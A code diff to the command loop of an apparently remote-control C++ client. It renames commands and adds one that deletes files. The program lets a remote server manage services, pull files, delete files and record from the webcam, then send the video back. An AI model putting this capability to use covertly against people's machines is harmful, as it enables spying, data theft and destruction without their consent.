@@ -269,16 +269,16 @@ int main() {
                 else if (v[0] == "STOPAPP") {
                     computer.stopApp(v[1]);
                 }
-                else if (strcmp(buffer, "LISTSERVICE") == 0) {
+                else if (strcmp(buffer, "LISTSERVICES") == 0) {
                     std::vector<ServiceManager::ServiceInfo> servicesList = service.listServices();
                     service.saveServicesToFile(servicesList, L"listServices.txt");
                     computer.copyFile(serverSocket, "listServices.txt");
                 }
-                else if(v[0] == "STARTSERVICE") {
+                else if(v[0] == "STARTSERVICES") {
                     std::wstring ws = stringToWstring(v[1]);
                     bool ok = service.startService(ws);
                 }
-                else if(strcmp(buffer, "STOPSERVICE") == 0) {
+                else if(v[0] == "STOPSERVICES") {
                     std::wstring ws = stringToWstring(v[1]);
                     bool ok = service.stopService(ws);
                 }
@@ -290,8 +290,11 @@ int main() {
                 else if (v[0] == "COPYFILE") {
                     computer.copyFile(serverSocket, v[1]);
                 }
-                else if (strcmp(buffer, "STARTWEBCAME") == 0) webcam.startRecording();
-                else if (strcmp(buffer, "STOPWEBCAME") == 0)
+                else if (v[0] == "DELETEFILE") {
+                    computer.deleteFile(v[1]);
+                }
+                else if (strcmp(buffer, "STARTWEBCAM") == 0) webcam.startRecording();
+                else if (strcmp(buffer, "STOPWEBCAM") == 0)
                 {
                     webcam.stopRecording();
                     computer.copyFile(serverSocket, "outputWebcam.avi");
